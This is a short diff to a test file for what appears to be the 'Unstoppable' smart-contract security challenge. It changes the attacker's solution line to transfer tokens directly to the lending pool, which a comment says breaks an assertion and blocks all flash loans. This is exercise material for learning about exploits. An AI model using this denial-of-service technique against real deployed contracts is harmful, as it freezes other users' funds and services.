@@ -48,7 +48,7 @@ describe('[Challenge] Unstoppable', function () {
             assertion fails and it reverts.
             Thus no one can call flashLoan. 
         */
-        await this.token.connect(attacker).receiveEther(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);
+        await this.token.connect(attacker).transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);
 
     });
 
